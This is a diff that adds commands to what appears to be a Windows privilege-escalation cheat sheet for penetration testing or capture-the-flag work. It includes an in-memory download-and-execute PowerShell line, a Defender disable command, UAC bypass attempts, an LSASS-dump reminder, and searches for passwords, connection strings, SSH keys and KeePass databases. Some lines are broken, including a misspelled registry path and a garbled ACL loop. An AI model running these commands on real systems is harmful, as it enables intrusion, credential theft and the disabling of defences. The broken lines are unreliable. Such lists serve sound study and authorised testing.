@@ -31,7 +31,9 @@
 ^Reminder:SeTakeOwnershipPrivilege detected! You can take ownership of protected files → run: SeTakeOwnership
 ^Reminder:SeDebugPrivilege detected! You can dump LSASS memory → run: SeDebugPrivilege
 ^Reminder:If HKLM\SOFTWARE\Microsoft\CoreShell is writable and user has SeShutdownPrivilege → Registry Hijack.
+^Reminder:If you are in a 32-bit shell on 64-bit Windows, launch sysnative PowerShell to avoid WOW64 path and registry redirection.
 
+^Network Enum:(New-Object Net.Sockets.TcpClient).Connect('<target>',<port>) #test TCP reachability from older PowerShell hosts without Test-NetConnection; target-machine
 whoami:whoami && hostname && ipconfig # quick context; target-machine
 whoami:whoami /all # full token info including groups and privileges; target-machine
 whoami:whoami /priv # Show only privileges; target-machine
@@ -44,6 +46,7 @@ System Info:wmic os get Caption,Version,OSArchitecture # Get OS info with wmic; 
 System Info:wmic computersystem get Name,Domain,Manufacturer,Model # Get computer info; target-machine
 System Info:wmic qfe get Caption,Description,HotFixID,InstalledOn # List installed patches; target-machine
 System Info:wmic qfe get HotFixID | findstr /R "KB[0-9][0-9][0-9][0-9][0-9]" # Extract KB numbers; target-machine
+User Enum:for /f "skip=4 tokens=1" %u in ('net user') do net user %u 2>nul #enumerate local users with detailed account properties from CMD; target-machine
 User Enum:net user # List local users; target-machine
 User Enum:net user <user> # Get details for specific user; target-machine
 User Enum:net user %USERNAME% # Get current user details; target-machine
@@ -52,6 +55,7 @@ User Enum:net user <user> /domain # Get domain user details; target-machine
 User Enum:net accounts # Local password policy; target-machine
 User Enum:net accounts /domain # Domain password policy; target-machine
 User Enum:net accounts && net user /domain && net accounts /domain # view local+domain password/lockout policy and list domain users; target-machine
+Group Enum:Get-LocalGroup | ForEach-Object { $_.Name; Get-LocalGroupMember $_.Name -ErrorAction SilentlyContinue } #enumerate local groups and members with PowerShell where supported; target-machine
 Group Enum:net localgroup # List local groups; target-machine
 Group Enum:net localgroup Administrators # List members of Administrators group; target-machine
 Group Enum:net localgroup "Remote Desktop Users" # List RDP users; target-machine
@@ -91,6 +95,7 @@ Service Enum:accesschk64.exe -uwcqv "BUILTIN\Users" * # Check what Users group c
 Service Enum:sc queryex type= service state= all # List all services with extended status; target-machine
 Service Enum:Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running*'} # enumerate running services + paths for hijacks; target-machine
 Service Enum:wmic service get name,pathname | findstr /i /v "C:\Windows\" | findstr /i /v """ # spot services running outside system dirs (more likely writable); target-machine
+Scheduled Tasks:Get-ScheduledTask | ForEach-Object { $t=$_; $t.Actions | Select-Object @{n='Task';e={$t.TaskName}},Execute,Arguments,@{n='User';e={$t.Principal.UserId}} } #list scheduled task actions and run-as users to identify writable task abuse paths; target-machine
 Scheduled Tasks:schtasks /query /fo LIST /v # List all scheduled tasks with details; target-machine
 Scheduled Tasks:schtasks /query /fo CSV /v > tasks.csv # Export tasks to CSV; target-machine
 Scheduled Tasks: schtasks /query /fo LIST /v # cmd.exe - enumerate scheduled tasks for creds, scripts, writable paths; target-machine
@@ -101,6 +106,8 @@ Scheduled Tasks: Get-ScheduledTask | Select TaskName, TaskPath, State, Actions #
 Scheduled Tasks: accesschk.exe - (powershell.exe)dqv "C:\Windows\Tasks" # Check Tasks folder permissions; target-machine
 Check installed apps:Get-ItemProperty "HKLM:\SOTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname # list 32-bit installed apps; target-machine
 Check installed apps:Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname # list 64-bit installed apps; target-machine
+AppLocker (view policy):Get-AppLockerPolicy -Effective -Xml 2>$null #dump effective AppLocker policy when executables or scripts appear blocked; target-machine
+AppLocker (view policy):Get-CimInstance -Namespace root\Microsoft\Windows\CI -ClassName CI_Policy 2>$null #check Windows Defender Application Control policy when AppLocker output is empty; target-machine
 AppLocker (view policy):Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections # view AppLocker policy; target-machine
 AppLocker (detailed view):Get-AppLockerPolicy -Effective | ConvertFrom-AppLockerPolicy | % {$_.RuleCollections} # detailed view; target-machine
 AppLocker (detailed view):# Common bypass locations: C:\Windows\Temp, C:\Windows\Tasks, C:\Windows\System32\spool\drivers\color
@@ -197,6 +204,7 @@ cmd:dir /r C:\Users\ /s /b 2>nul | findstr ":" # enumerate Alternate Data Stream
 powershell:gci C:\ -Recurse -Force -EA 0 | Get-Item -Stream * -EA 0 | % { "[ADS]" + $_.FileName + ":" + $_.Stream } # PowerShell ADS enumeration across drive
 powershell:gci C:\ -File -Recurse -Force -EA 0 | ?{ $_.Length -lt 5000 } | % { dir $_.FullName /R -EA 0 | findstr ":"; $_.FullName } # focus ADS hunt on small files (flags/notes often small)
 powershell:gci C:\ -Recurse -Force -EA 0 | % { (Get-Acl $_.FullName -EA 0).Owner + " -> " + $_.FullName } | findstr /i "admin" # spot admin-owned paths for possible misconfigs
+powershell:%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -NoProfile #launch 64-bit PowerShell from a 32-bit shell to avoid WOW64 redirection issues; target-machine
 cmd:for /f "delims=" %i in ('dir C:\ /s /b 2^>nul') do @for /f "delims=" %c:\sysprep.inf in ('icacls "%i" 2^>nul ^| findstr /i "BUILTIN Administrators"') do @echo "[OWNER]%i" # ACL sweep for admin-owned entries
 powershell:ls C:\inetpub\wwwroot\ -Recurse -Force -EA 0 | % { dir $_.FullName /R -EA 0 | findstr ":"; $_.FullName } # ADS hunt in IIS webroot for hidden webshells/flags
 powershell:powershell -nop -c "Get-ChildItem -Stream * -EA 0 | %{$_.FileName+':'+$_.Stream}" # enumerate ADS streams in current folder
@@ -319,6 +327,7 @@ AlwaysInstallElevated Exploit (install MSI):msiexec /quiet /qn /i <filename1>.ms
 UAC Bypass:Start-Process powershell -Verb RunAs -ArgumentList '-ExecutionPolicy Bypass' # Attempt UAC bypass; target-machine
 UAC Bypass:.\UACMe.exe # Run UACMe tool; target-machine
 UAC Bypass:powershell -c "Start-Process cmd -Verb RunAs" # Run cmd as admin; target-machine
+Windows Defender:Get-NetFirewallRule -Enabled True -Direction Inbound | Get-NetFirewallPortFilter | Where-Object {$_.LocalPort -ne 'Any'} | Select-Object Protocol,LocalPort #list enabled inbound firewall rules with explicit local ports; target-machine
 Windows Defender:Get-MpComputerStatus | Select RealTimeProtectionEnabled # Check Defender status; target-machine
 Windows Defender:Get-MpThreatDetection | Select-Object -First 20 # see recent Defender detections/quarantine events; target-machine
 Windows Defender:Set-MpPreference -DisableRealtimeMonitoring $true # Disable real-time monitoring; target-machine
@@ -412,7 +421,9 @@ powershell:powershell -enc ZQBjAGgAbwAgAFsAUwBdADsAIABwAG8AdwBlAHIAcwBoAGUAbABsA
 powershell:powershell.exe -ep bypass # bypass execution policy for script tooling
 powershell:powershell -c invoke-item C:\Windows\Tasks\temp.lnk # execute a shortcut (can trigger persistence/abuse path)
 powershell:powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://<target>:<port>/<filename1>')" # in-memory PowerShell script execution from HTTP
-^loot:Start-Process powershell -Verb RunAs -ArgumentList '-ExecutionPolicy Bypass' # attempt elevate PS with UAC prompt; target-machine
+^loot:findstr /spin /i "connectionString password uid user id= server=" C:\inetpub\wwwroot\* C:\xampp\htdocs\* C:\ProgramData\* 2>nul #search IIS/XAMPP/application directories for connection strings and credentials; target-machine
+loot:Get-ChildItem C:\Users,C:\ProgramData -Recurse -File -ErrorAction SilentlyContinue -Include *.kdbx,*.rdp,id_rsa,*.ppk,*.config,*.ini,*.xml,*.bak,*.old #find credential containers, remote access files, configs, keys, and backups in user/program data paths; target-machine
+loot:Start-Process powershell -Verb RunAs -ArgumentList '-ExecutionPolicy Bypass' # attempt elevate PS with UAC prompt; target-machine
 loot:c:\sysprep.inf # check unattended install file (may contain plaintext creds); target-machine
 loot:c:\sysprep\sysprep.xml # check unattended install file (may contain plaintext creds); target-machine
 loot:c:\unattend.xml # check unattended install file (may contain plaintext creds); target-machine
